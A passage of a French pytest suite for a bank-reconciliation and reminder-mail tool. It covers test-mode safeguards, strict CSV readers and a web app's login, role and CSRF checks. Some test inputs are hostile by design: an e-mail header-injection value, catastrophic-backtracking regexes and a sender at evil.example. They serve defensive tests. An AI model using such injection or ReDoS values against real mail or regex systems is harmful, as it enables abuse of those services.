    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    ligne = {"cellule_vide": "ALPHA,Alpha SARL,compta@alpha-sarl.fr,M,15,courtois,,",
             "colonne_absente": "ALPHA,Alpha SARL,compta@alpha-sarl.fr,M,15,courtois",
             "espaces": "ALPHA,Alpha SARL,compta@alpha-sarl.fr,M,15,courtois,   ,"}[variante]
    entete = ("dossier,raison_sociale,email_contact,nom_contact,jour_echeance_tva,ton_relance"
              + ("" if variante == "colonne_absente" else ",circuit,email_relais"))
    (entree / "dossiers.csv").write_text(f"{entete}\n{ligne}\n", encoding="utf-8")
    inst = nouvelle_instance(tmp_path / "i")
    code = charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine),
                               "--date", J0.isoformat()])
    assert code == 1 and "circuit" in capsys.readouterr().err
    assert not inst.depot.exists() and not list(inst.sortie.iterdir())


def test_regression_a1_code_dossier_duplique_dans_dossiers_csv(tmp_path) -> None:
    chemin = tmp_path / "d.csv"
    chemin.write_text(
        "dossier,raison_sociale,email_contact,nom_contact,circuit,email_relais\n"
        "ALPHA,Alpha,compta@alpha.fr,M,C-RELAIS,pieces@cabinet-relais.fr\n"
        "ALPHA,Alpha (copie),compta@alpha.fr,M,C-DIRECT,\n", encoding="utf-8")
    try:
        d = lire_dossiers(chemin, circuit_obligatoire=True)
    except ErreurFormat:
        return
    assert d["ALPHA"].circuit == "C-RELAIS"


# --- Mode test (A18 et garde-fous) -----------------------------------------------


def _brouillon_valide(tmp_path: Path, **config):
    entree = ecrire_entree(tmp_path / "e")
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    if config:
        inst.config.write_text(_json.dumps(config), encoding="utf-8")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    return entree, inst, b


def test_sain_mode_test_jamais_l_adresse_reelle_dans_les_en_tetes(tmp_path) -> None:
    # Instance de TEST (config.json) : le mode est fige des le premier cycle.
    _, inst, b = _brouillon_valide(tmp_path, mode_test=True)
    assert cycle.mode_instance(inst) == "test"
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE)
    [f] = list(inst.outbox.glob("*.eml"))
    brut = f.read_bytes()
    entetes = brut.split(b"\r\n\r\n")[0]
    msg = BytesParser(policy=policy.default).parsebytes(brut)
    assert msg["To"] == "test@exemple.invalid" and msg["Subject"].startswith("[TEST] ")
    assert b"alpha-sarl" not in entetes
    assert all(msg[h] is None for h in ("Cc", "Bcc", "Reply-To", "Sender", "Return-Path"))


@pytest.mark.parametrize("contenu", [
    b'{"mode_test": "false"}', b'{"mode_test": "0"}', b'{"mode_test": 0}', b'{"mode_test": 1}',
    b'{"mode_test": null}', b"{", b"", b"[]", b"null", b"\xff\xfe",
    b'{"mode_test": true, "adresse_test": "a@b.fr\\r\\nBcc: x@y.z"}', b'{"mode_test": true, "adresse_test": ""}',
    b'{"mode_test": false, "adresse_test": 5}', b'{"mode_test": false, "limite_hebdomadaire": "false"}',
    b'{"mode_test": false, "creneau_envoi_libre": 1}',
])
def test_sain_mode_test_config_invalide_refus_lisible_avant_ecriture(tmp_path, capsys, contenu) -> None:
    entree = ecrire_entree(tmp_path / "e")
    inst = nouvelle_instance(tmp_path / "i")
    inst.config.write_bytes(contenu)
    code = charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine),
                               "--date", J0.isoformat()])
    assert code == 1 and "config.json" in capsys.readouterr().err
    assert not inst.depot.exists()


def test_sain_mode_test_garde_fous_sans_effet_hors_mode_test(tmp_path) -> None:
    """`creneau_envoi_libre` et `limite_hebdomadaire: false` sans `mode_test` : aucun effet."""
    _, inst, b = _brouillon_valide(tmp_path, creneau_envoi_libre=True, limite_hebdomadaire=False)
    assert cycle.garde_fous_mode_test(inst) == ()
    with pytest.raises(envoi.EnvoiHorsCreneau):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0, 7, 59), par=VALIDEUSE)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE)
    # Second brouillon vers le meme destinataire, le lendemain : la limite d'un e-mail par 7 jours tient.
    with Depot(inst.depot) as d:
        d.sauver_brouillon(_dc.replace(b, id_relance="EXTRA00000000002", niveau=2, statut=StatutBrouillon.BROUILLON,
                                       valide_par="", valide_le=None, envoye_le=None))
    cycle.valider_relance(inst, "EXTRA00000000002", VALIDEUSE, maintenant=a(J0))
    with pytest.raises(envoi.EnvoiNonValide, match="7 jours"):
        cycle.envoyer_relance(inst, "EXTRA00000000002", maintenant=a(J0 + dt.timedelta(days=1)), par=VALIDEUSE)
    assert len(list(inst.outbox.glob("*.eml"))) == 1


def test_sain_a1_mode_test_accepte_un_dossier_sans_circuit_en_l_annoncant(tmp_path, capsys) -> None:
    dossiers = [["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert charger_cli().main(["cycle", "--entree", str(entree), "--mode-test", *base]) == 0
    sortie = capsys.readouterr().out
    assert "MODE TEST" in sortie and "circuit absent" in sortie
    assert "circuit_par_defaut" in [e.action for e in _Journal(inst.audit).lire()]


def test_regression_a1_cycle_mode_test_puis_envoi_reel_sans_circuit(tmp_path) -> None:
    dossiers = [["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=[OPERATIONS[0]])
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    cli.main(["cycle", "--entree", str(entree), "--mode-test", *base])
    [b] = cycle.brouillons(inst)
    cli.main(["valider", b.id_relance, "--par", VALIDEUSE, *base])
    cli.main(["envoyer", b.id_relance, "--par", VALIDEUSE, *base])
    destinataires = [BytesParser(policy=policy.default).parsebytes(f.read_bytes())["To"]
                     for f in inst.outbox.glob("*.eml")]
    assert "compta@alpha-sarl.fr" not in destinataires


def test_regression_mode_test_envoi_enregistre_comme_reel(tmp_path) -> None:
    """Une instance REELLE refuse tout envoi `--mode-test` (il serait enregistre comme reel :
    historique, pieces DEMANDEE, limite hebdomadaire) ; dans une instance de TEST, tout est
    simule, y compris cet historique (consequence voulue, documentee)."""
    _, inst, b = _brouillon_valide(tmp_path / "reelle")
    avant = (etat_brut(inst), inst.audit.read_bytes())
    with pytest.raises(cycle.ModeInstanceIncompatible):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE, mode_test=True)
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["envoyer", b.id_relance, "--par", VALIDEUSE, "--mode-test", *base]) == 1
    assert cli.main(["cycle", "--entree", str(tmp_path / "reelle" / "e"), "--mode-test", *base]) == 1
    assert (etat_brut(inst), inst.audit.read_bytes()) == avant
    assert list(inst.outbox.glob("*.eml")) == [] and cycle.mode_instance(inst) == "reel"
    # Converse : une instance de test dont on retire config.json (donc mode reel demande) refuse l'envoi.
    _, inst_t, bt = _brouillon_valide(tmp_path / "test", mode_test=True)
    inst_t.config.unlink()
    with pytest.raises(cycle.ModeInstanceIncompatible):
        cycle.envoyer_relance(inst_t, bt.id_relance, maintenant=a(J0), par=VALIDEUSE)
    assert list(inst_t.outbox.glob("*.eml")) == []


# --- A15 : alias fournisseurs -------------------------------------------------------


@pytest.mark.parametrize("alias", ["ab", "a", "cb", "--", "(a+)+$", "   "])
def test_sain_a15_alias_trop_courts_ou_vides_refuses(tmp_path, alias) -> None:
    entree = ecrire_entree(tmp_path / "e")
    (entree / "alias_fournisseurs.csv").write_text(f'alias,fournisseur\n"{alias}",Orange\n', encoding="utf-8")
    from rapprochement.parseurs import ErreurFormat as EF
    with pytest.raises(EF):
        cycle.lire_entrees(entree)


def test_sain_a15_alias_avec_caracteres_de_regex_reste_litteral() -> None:
    moteur = Moteur(alias={"o.h x": "OVH"})
    pc = Piece("P", "A", "f.pdf", "OVH", dt.date(2026, 9, 2), Decimal("10.00"))
    litteral = OperationBancaire("R1", "A", dt.date(2026, 9, 3), "CB O.H X", Decimal("10.00"), Sens.DEBIT)
    autre = OperationBancaire("R2", "A", dt.date(2026, 9, 3), "CB OAH X", Decimal("10.00"), Sens.DEBIT)
    assert moteur._similarite(litteral, pc) == 1.0 and moteur._similarite(autre, pc) < 1.0


# --- Moteur : familles que le generateur ne produit pas ---------------------------------


def _rapprocher(ops, pieces):
    return {r.operation.reference: (r.statut, r.regle) for r in Moteur().rapprocher(ops, pieces)}


def _op(ref, jour, lib, montant, devise="EUR"):
    return OperationBancaire(ref, "A", jour, lib, Decimal(montant), Sens.DEBIT, devise=devise)


def _pc(ident, jour, fournisseur, montant, devise="EUR"):
    return Piece(ident, "A", "f.pdf", fournisseur, jour, Decimal(montant), devise=devise)


def test_sain_moteur_familles_ambigues_jamais_une_piece_perdue() -> None:
    D = dt.date
    # Deux paiements identiques, une facture : aucun n'est justifie en silence.
    r = _rapprocher([_op("R1", D(2026, 9, 3), "CB LOXAM", "120.00"), _op("R2", D(2026, 9, 10), "CB LOXAM", "120.00")],
                    [_pc("P", D(2026, 9, 2), "LOXAM", "120.00")])
    assert {k: v[0] for k, v in r.items()} == {"R1": Statut.MANQUANT, "R2": Statut.MANQUANT}
    # Trois paiements recurrents, une facture.
    r = _rapprocher([_op(f"R{i}", D(2026, 9, 3 + 7 * i), "CB LOXAM", "120.00") for i in range(3)],
                    [_pc("P", D(2026, 9, 2), "LOXAM", "120.00")])
    assert all(v[0] is Statut.MANQUANT for v in r.values())
    # Un centime d'ecart : l'exact gagne, l'autre reste manquant (relance).
    r = _rapprocher([_op("R1", D(2026, 9, 3), "CB LOXAM", "120.00"), _op("R2", D(2026, 9, 10), "CB LOXAM", "120.01")],
                    [_pc("P", D(2026, 9, 2), "LOXAM", "120.00")])
    assert (r["R1"][0], r["R2"][0]) == (Statut.JUSTIFIE, Statut.MANQUANT)
    # Devises mixtes.
    r = _rapprocher([_op("R1", D(2026, 9, 3), "CB LOXAM", "120.00", "USD")], [_pc("P", D(2026, 9, 2), "LOXAM", "120.00")])
    assert r["R1"][0] is Statut.MANQUANT


def test_regression_moteur_un_avoir_justifie_un_paiement(tmp_path) -> None:
    chemin = tmp_path / "p.csv"
    chemin.write_text("id_piece,dossier,fichier,fournisseur,date_facture,montant_ttc\n"
                      "AV1,A,avoir.pdf,LOXAM,2026-09-02,\"-120,00\"\n", encoding="utf-8")
    op = _op("R1", dt.date(2026, 9, 3), "CB LOXAM LOCATION", "120.00")
    with pytest.raises(ErreurFormat, match="avoir|negatif"):          # refus lisible : l'avoir n'est jamais une facture
        lire_pieces(chemin)


def test_regression_releve_debit_negatif_lu_comme_paiement(tmp_path) -> None:
    chemin = tmp_path / "r.csv"
    chemin.write_text("dossier,date_operation,libelle,debit,credit,reference\n"
                      'A,2026-09-03,REMBOURSEMENT LOXAM,"-50,00",,R1\n', encoding="utf-8")
    [o] = lire_releve(chemin)
    assert o.sens is Sens.CREDIT


# ===========================================================================
# 11. Cinquieme passage : mode fige, lecteurs stricts, application web
# ===========================================================================

import contextlib as _contextlib  # noqa: E402
import io as _io  # noqa: E402
import re as _re  # noqa: E402
import shutil as _shutil  # noqa: E402
from urllib.parse import urlencode as _urlencode  # noqa: E402
from wsgiref.util import setup_testing_defaults as _setup_wsgi  # noqa: E402
from zoneinfo import ZoneInfo as _ZoneInfo  # noqa: E402


def _refuse(appel) -> bool:
    """Vrai si l'appel est refuse proprement par le cycle (jamais une trace Python)."""
    try:
        appel()
    except (cycle.ErreurCycle, envoi.EnvoiNonValide, _etats.TransitionInterdite, ErreurFormat):
        return True
    return False


def _instance_test(tmp_path: Path):
    """Instance de TEST complete : un cycle, un brouillon valide et envoye (simule)."""
    entree, inst, b = _brouillon_valide(tmp_path, mode_test=True)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE)
    return entree, inst, b


# --- 1. Mode fige : contournements -------------------------------------------------------


def _operations_ecriture(inst, b):
    return {
        "envoyer": lambda: cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE),
        "rejeter": lambda: cycle.rejeter_relance(inst, b.id_relance, VALIDEUSE, "x", maintenant=a(J0)),
        "valider": lambda: cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0)),
        "rattacher": lambda: cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(J0), dossier="ALPHA",
                                                   reference="A-001", id_piece="p"),
        "controler": lambda: cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True, maintenant=a(J0)),
        "bloquer": lambda: cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="m", maintenant=a(J0)),
        "debloquer": lambda: cycle.debloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="m", maintenant=a(J0)),
        "promesse": lambda: cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=J0, maintenant=a(J0)),
        "arbitrer": lambda: cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="m", maintenant=a(J0)),
        "trancher": lambda: cycle.trancher_envoi(inst, b.id_relance, RESPONSABLE, parti=True, maintenant=a(J0)),
        "reparer": lambda: cycle.reparer_audit(inst, RESPONSABLE, maintenant=a(J0)),
    }


@pytest.mark.parametrize("nom", ["envoyer", "rejeter", "valider", "rattacher", "controler", "bloquer", "debloquer",
                                 "promesse", "arbitrer", "trancher", "reparer"])
def test_sain_mode_fige_config_modifiee_entre_deux_appels(tmp_path, nom) -> None:
    """Instance reelle + config.json passe en mode test (ou l'inverse) : AUCUNE ecriture."""
    entree, inst, b = _brouillon_valide(tmp_path / "reelle")
    inst.config.write_text('{"mode_test": true}', encoding="utf-8")
    avant = (etat_brut(inst), inst.audit.read_bytes())
    with pytest.raises(cycle.ModeInstanceIncompatible):
        _operations_ecriture(inst, b)[nom]()
    assert (etat_brut(inst), inst.audit.read_bytes()) == avant
    _, inst_t, bt = _instance_test_sans_envoi(tmp_path / "test")
    inst_t.config.unlink()
    avant = (etat_brut(inst_t), inst_t.audit.read_bytes())
    with pytest.raises(cycle.ModeInstanceIncompatible):
        _operations_ecriture(inst_t, bt)[nom]()
    assert (etat_brut(inst_t), inst_t.audit.read_bytes()) == avant


def _instance_test_sans_envoi(tmp_path: Path):
    return _brouillon_valide(tmp_path, mode_test=True)


def test_sain_mode_fige_instance_copiee_garde_son_mode(tmp_path) -> None:
    entree, inst, _ = _brouillon_valide(tmp_path / "reelle")
    copie = cycle.Instance(tmp_path / "copie")
    _shutil.copytree(inst.racine, copie.racine)
    assert cycle.mode_instance(copie) == "reel"
    copie.config.write_text('{"mode_test": true}', encoding="utf-8")
    with pytest.raises(cycle.ModeInstanceIncompatible):
        cycle.executer_cycle(entree, copie, J0, a(J0))
    with pytest.raises(cycle.ModeInstanceIncompatible):
        cycle.executer_cycle(entree, copie, J0, a(J0), mode_test=True)


def test_sain_mode_fige_marqueurs_contradictoires_refus(tmp_path) -> None:
    """Deux marqueurs a la fois (base alteree) : refus, jamais de choix arbitraire."""
    entree, inst, b = _brouillon_valide(tmp_path)
    with Depot(inst.depot) as d:
        d.marquer_vu(cycle.CLE_MODE_INSTANCE + "test")
    for mode in (False, True):
        with pytest.raises(cycle.ModeInstanceIncompatible):
            cycle.rejeter_relance(inst, b.id_relance, VALIDEUSE, "x", maintenant=a(J0), mode_test=mode)


def _supprimer_marqueurs(inst: cycle.Instance) -> None:
    con = sqlite3.connect(inst.depot)
    with con:
        con.execute("DELETE FROM vus WHERE cle LIKE 'mode-instance:%'")
    con.close()


def test_regression_mode_fige_marqueur_supprime_test_devient_reelle(tmp_path) -> None:
    entree, inst, _ = _instance_test(tmp_path)
    _supprimer_marqueurs(inst)
    inst.config.unlink()
    assert _refuse(lambda: lancer(entree, inst, J0 + dt.timedelta(days=1)))
    assert cycle.mode_instance(inst) != "reel"


def test_regression_mode_fige_base_recreee_journal_contradictoire(tmp_path) -> None:
    entree, inst, _ = _brouillon_valide(tmp_path)
    for chemin in tmp_path.glob("i/depot.sqlite*"):
        chemin.unlink()
    assert _refuse(lambda: cycle.executer_cycle(entree, inst, J0, a(J0), mode_test=True))


def test_regression_mode_test_adresse_test_egale_adresse_client(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e")
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    inst.config.write_text(_json.dumps({"mode_test": True, "adresse_test": "compta@alpha-sarl.fr"}), encoding="utf-8")
    try:
        lancer(entree, inst, J0)
        b = brouillon_de(inst, "compta@alpha-sarl.fr")
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE)
    except cycle.ErreurCycle:
        return                                                       # refus lisible : acceptable
    [f] = list(inst.outbox.glob("*.eml"))
    assert BytesParser(policy=policy.default).parsebytes(f.read_bytes())["To"] != "compta@alpha-sarl.fr"


# --- 2. Lecteurs stricts -------------------------------------------------------------------

ENTETE_RELEVE = "dossier,date_operation,libelle,debit,credit,reference\n"


def _cli_cycle(tmp_path: Path, **fichiers) -> object:
    """Code de sortie de `cycle` ou l'exception levee (une trace Python = defaut)."""
    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    for nom, contenu in fichiers.items():
        (entree / f"{nom}.csv").write_text(contenu, encoding="utf-8")
    inst = nouvelle_instance(tmp_path / "i")
    with _contextlib.redirect_stdout(_io.StringIO()), _contextlib.redirect_stderr(_io.StringIO()):
        try:
            return charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine),
                                       "--date", J0.isoformat()])
        except BaseException as exc:  # noqa: BLE001
            return exc


@pytest.mark.parametrize("fichier, contenu", [
    ("releve_bancaire", "dossier,date_operation,libelle,debit,credit,reference\nALPHA,2026-09-03,CB X,12.50,,R1\n"),
    ("releve_bancaire", "﻿dossier,date_operation,libelle,debit,credit,reference\r\nALPHA,2026-09-03,CB X,12.50,,R1\r\n"),
    ("pieces_recues", "id_piece,dossier,fichier,fournisseur,date_facture,montant_ttc\nP1,ALPHA,f.pdf,X,2026-09-02,12.50\n"),
    # En-tetes normalises (casse, accents, espaces) et BOM double : acceptes depuis la lecture stricte.
    ("releve_bancaire", "Dossier,Date_operation,Libelle,Debit,Credit,Reference\nALPHA,2026-09-03,CB X,12.50,,R1\n"),
    ("releve_bancaire", "dossier,date_operation,libelle,D\u00e9bit,Cr\u00e9dit,reference\nALPHA,2026-09-03,CB X,12.50,,R1\n"),
    ("releve_bancaire", "\ufeff\ufeffdossier,date_operation,libelle,debit,credit,reference\nALPHA,2026-09-03,CB X,12.50,,R1\n"),
])
def test_sain_lecteurs_variantes_bien_formees_acceptees(tmp_path, fichier, contenu) -> None:
    assert _cli_cycle(tmp_path, **{fichier: contenu}) == 0


@pytest.mark.parametrize("octets, motif", [
    ("dossier;date_operation;libelle;debit;credit;reference\nALPHA;2026-09-03;CB X;12.50;;R1\n", "colonnes"),
    ("", "colonnes"),
    (ENTETE_RELEVE + "ALPHA,0000-00-00,CB X,12.50,,R1\n", "Date"),
    (ENTETE_RELEVE + "ALPHA,2026-09-03,CB X,12.50 12.50,,R1\n", "Montant"),
    (ENTETE_RELEVE + "ALPHA,2026-09-03,CB X,12.50,5.00,R1\n", "debit ET credit"),
])
def test_sain_lecteur_releve_refus_lisible(tmp_path, octets, motif, capsys) -> None:
    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    (entree / "releve_bancaire.csv").write_text(octets, encoding="utf-8")
    inst = nouvelle_instance(tmp_path / "i")
    code = charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine), "--date", J0.isoformat()])
    erreur = capsys.readouterr().err
    assert code == 1 and "REFUS" in erreur and motif in erreur and "Traceback" not in erreur
    assert not inst.depot.exists()


@pytest.mark.parametrize("encodage", ["cp1252", "utf-16", "latin-1"])
def test_sain_lecteurs_encodages_non_utf8_refus_lisible(tmp_path, encodage, capsys) -> None:
    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    (entree / "releve_bancaire.csv").write_bytes((ENTETE_RELEVE + "ALPHA,2026-09-03,CB CAFÉ,12.50,,R1\n").encode(encodage))
    inst = nouvelle_instance(tmp_path / "i")
    code = charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine), "--date", J0.isoformat()])
    assert code == 1 and "UnicodeDecodeError" in capsys.readouterr().err and not inst.depot.exists()


@pytest.mark.parametrize("entetes", ["Débit,Crédit", "Debit,Credit", "DEBIT,CREDIT", "montant,sens"])
def test_regression_releve_colonnes_debit_credit_absentes_lignes_sautees(tmp_path, entetes) -> None:
    chemin = tmp_path / "r.csv"
    chemin.write_text(f"dossier,date_operation,libelle,{entetes},reference\n"
                      "ALPHA,2026-09-03,CB X,120.00,,R1\nALPHA,2026-09-04,CB Y,50.00,,R2\n", encoding="utf-8")
    try:
        operations = lire_releve(chemin)
    except ErreurFormat:
        return
    assert len(operations) == 2


def test_regression_releve_ligne_courte_sautee_en_silence(tmp_path) -> None:
    chemin = tmp_path / "r.csv"
    chemin.write_text(ENTETE_RELEVE + "ALPHA,2026-09-03,CB X,120.00,,R1\nALPHA,2026-09-04,CB Y\n", encoding="utf-8")
    try:
        operations = lire_releve(chemin)
    except ErreurFormat:
        return
    assert len(operations) == 2


@pytest.mark.parametrize("fichier, valeur", [
    ("releve_bancaire", "NaN"), ("releve_bancaire", "Infinity"), ("releve_bancaire", "-Infinity"),
    ("pieces_recues", "NaN"), ("pieces_recues", "Infinity"),
])
def test_regression_montants_non_finis_trace_python(tmp_path, fichier, valeur) -> None:
    contenu = {
        "releve_bancaire": ENTETE_RELEVE + f"ALPHA,2026-09-03,CB X,{valeur},,R1\n",
        "pieces_recues": "id_piece,dossier,fichier,fournisseur,date_facture,montant_ttc\n"
                         f"P1,ALPHA,f.pdf,LOXAM,2026-09-02,{valeur}\n",
    }[fichier]
    assert _cli_cycle(tmp_path, **{fichier: contenu}) == 1


def test_regression_montant_anglo_saxon_milliers_virgule_lu_faux(tmp_path) -> None:
    chemin = tmp_path / "r.csv"
    chemin.write_text(ENTETE_RELEVE + 'ALPHA,2026-09-03,CB X,"1,234.56",,R1\n', encoding="utf-8")
    try:
        [o] = lire_releve(chemin)
    except ErreurFormat:
        return
    assert o.montant == Decimal("1234.56")


def test_regression_champ_geant_trace_python(tmp_path) -> None:
    contenu = ENTETE_RELEVE + "ALPHA,2026-09-03," + "X" * 200_000 + ",120.00,,R1\n"
    assert _cli_cycle(tmp_path, releve_bancaire=contenu) == 1


@pytest.mark.parametrize("contact", ["", "pas-un-email", "a@b.fr, c@d.fr"])
def test_regression_dossier_direct_sans_adresse_valide(tmp_path, contact) -> None:
    chemin = tmp_path / "d.csv"
    chemin.write_text("dossier,raison_sociale,email_contact,nom_contact,circuit,email_relais\n"
                      f'ALPHA,Alpha,"{contact}",M,C-DIRECT,\n', encoding="utf-8")
    try:
        lire_dossiers(chemin, circuit_obligatoire=True)
    except ErreurFormat:
        return
    raise AssertionError("adresse de contact invalide acceptee pour un dossier C-DIRECT")


@pytest.mark.parametrize("regex", [".*", "^", "$", "a*", "(?:)", ".?"])
def test_regression_exclusion_regex_qui_correspond_a_tout(tmp_path, regex) -> None:
    chemin = tmp_path / "x.csv"
    chemin.write_text(f'dossier,motif_regex,motif\nALPHA,"{regex}",m\n', encoding="utf-8")
    try:
        ref = Referentiel.depuis_csv(chemin)
    except ErreurFormat:
        return
    assert ref.exclure(OPERATION_LOXAM)[0] is False


def test_regression_exclusion_dossier_nfd_jamais_appliquee(tmp_path) -> None:
    chemin = tmp_path / "x.csv"
    chemin.write_text("dossier,motif_regex,motif\nCAFÉ,loxam,m\n", encoding="utf-8")
    op = _dc.replace(OPERATION_LOXAM, dossier="CAFÉ")
    try:
        ref = Referentiel.depuis_csv(chemin)
    except ErreurFormat:
        return
    assert ref.exclure(op)[0] is True


def test_regression_exclusion_regex_catastrophique_contourne_le_garde_fou(tmp_path) -> None:
    chemin = _csv_exclusions(tmp_path / "x.csv", [["ALPHA", "(a?){30}a{30}", "m", "r1", "Paul", "2026-10-01", "validee"]])
    script = _SCRIPT_REGEX.format(src=str(RACINE / "src"), csv=str(chemin))
    try:
        sortie = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=6)
    except subprocess.TimeoutExpired:
        raise AssertionError("cycle gele > 6 s") from None
    assert sortie.returncode == 0 or "ErreurFormat" in sortie.stderr


# --- 3. Application web -------------------------------------------------------------------

from rapprochement.web import comptes as _comptes  # noqa: E402
from rapprochement.web.application import Application as _Application  # noqa: E402

_PARIS = _ZoneInfo("Europe/Paris")
_MDP = "motdepasse-de-test-1"


class _ClientWeb:
    """Petit client WSGI (cookies, CSRF) : l'application est appelee sans reseau."""

    def __init__(self, app, hote: str = "127.0.0.1:8000") -> None:
        self.app, self.hote, self.cookies = app, hote, {}

    def requete(self, methode, chemin, donnees=None, entetes=None, cookies=True):
        chemin_seul, _, qs = chemin.partition("?")
        corps = _urlencode(donnees or {}, errors="surrogatepass").encode("ascii") if donnees is not None else b""
        environ = {"REQUEST_METHOD": methode, "SCRIPT_NAME": "", "PATH_INFO": chemin_seul, "QUERY_STRING": qs,
                   "HTTP_HOST": self.hote, "REMOTE_ADDR": "127.0.0.1", "wsgi.input": _io.BytesIO(corps),
                   "CONTENT_LENGTH": str(len(corps)) if corps else ""}
        if donnees is not None:
            environ["CONTENT_TYPE"] = "application/x-www-form-urlencoded"
            environ["HTTP_ORIGIN"] = f"http://{self.hote}"
        if self.cookies and cookies:
            environ["HTTP_COOKIE"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        for k, v in (entetes or {}).items():
            environ["HTTP_" + k.upper().replace("-", "_")] = v
        _setup_wsgi(environ)
        recu = {}

        def start_response(statut, ent, exc_info=None):
            recu["statut"], recu["entetes"] = statut, ent

        corps_rep = b"".join(self.app(environ, start_response))
        for k, v in recu["entetes"]:
            if k.lower() == "set-cookie":
                nom, _, reste = v.partition("=")
                if "Max-Age=0" in v:
                    self.cookies.pop(nom, None)
                else:
                    self.cookies[nom] = reste.split(";")[0]
        return int(recu["statut"].split()[0]), dict(recu["entetes"]), corps_rep.decode("utf-8")

    def csrf(self, chemin="/"):
        _, _, texte = self.requete("GET", chemin)
        m = _re.search(r'name="csrf" value="([^"]+)"', texte)
        assert m, texte[:200]
        return m.group(1)

    def connecter(self, identifiant):
        jeton = self.csrf("/connexion")
        statut, _, texte = self.requete("POST", "/connexion", {"identifiant": identifiant, "mot_de_passe": _MDP, "csrf": jeton})
        assert statut == 303, texte

    def action(self, chemin, donnees=None, page="/"):
        return self.requete("POST", chemin, {"csrf": self.csrf(page), **(donnees or {})})


@pytest.fixture(scope="module")
def _modele_comptes_web(tmp_path_factory) -> Path:
    rep = tmp_path_factory.mktemp("comptes_web")
    _comptes.creer_utilisateur(rep, "alice", "Alice Durand", _comptes.RESPONSABLE, _MDP)
    _comptes.creer_utilisateur(rep, "bob", "Bob Martin", _comptes.COMPTABLE, _MDP)
    return rep


@pytest.fixture
def web(tmp_path, _modele_comptes_web):
    """(instance semee, application) : une file humaine, des brouillons, des pieces."""
    entree = ecrire_entree(tmp_path / "e")
    inst = nouvelle_instance(tmp_path / "instance", None)
    for nom in ("utilisateurs.json", "validateurs.txt", "responsables.txt"):
        _shutil.copy(_modele_comptes_web / nom, inst.racine / nom)
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<m1@x>", objet="facture 120,00 EUR",
                                             fichiers=(("f_2026-09.pdf", b"%PDF A"),)))
    (inst.entrant / "2.eml").write_bytes(eml("inconnu@evil.example", "<m2@x>", fichiers=(("g.pdf", b"%PDF B"),)))
    lancer(entree, inst, J0)
    app = _Application(inst, horloge=lambda: dt.datetime(2026, 10, 5, 10, 0, tzinfo=_PARIS))
    yield inst, app
    app.fermer()


ROUTES_RESPONSABLE = ["/audit", "/audit/exporter", "/audit/reparer", "/pieces/arbitrer"]
ROUTES_ECRAN = ["/", "/brouillons", "/non-rattaches", "/pieces", "/escalades", "/audit"]


def test_sain_web_acces_sans_compte_redirige_et_n_ecrit_rien(web) -> None:
    inst, app = web
    c = _ClientWeb(app)
    avant = (etat_brut(inst), inst.audit.read_bytes())
    for chemin in ROUTES_ECRAN + ["/brouillons/x", "/inexistant"]:
        statut, ent, _ = c.requete("GET", chemin)
        assert statut == 303 and ent["Location"] == "/connexion", chemin
    for chemin in ["/pieces/bloquer", "/audit/reparer", "/non-rattaches/confirmer", "/brouillons/abc/valider"]:
        statut, ent, _ = c.requete("POST", chemin, {"csrf": "x"})
        assert statut == 303 and ent["Location"] == "/connexion", chemin
    assert (etat_brut(inst), inst.audit.read_bytes()) == avant


def test_sain_web_roles_comptable_ne_franchit_pas_les_routes_de_responsable(web) -> None:
    inst, app = web
    bob = _ClientWeb(app)
    bob.connecter("bob")
    avant = (etat_brut(inst), inst.audit.read_bytes())
    for chemin in ROUTES_RESPONSABLE:
        statut, _, _ = bob.requete("GET", chemin) if chemin == "/audit" else bob.action(chemin, {"dossier": "ALPHA",
                                                                                              "reference": "A-001", "motif": "x"})
        assert statut == 403, chemin
    d = [x for x in cycle.lister_file(inst) if x.dossier == "ALPHA"][0]
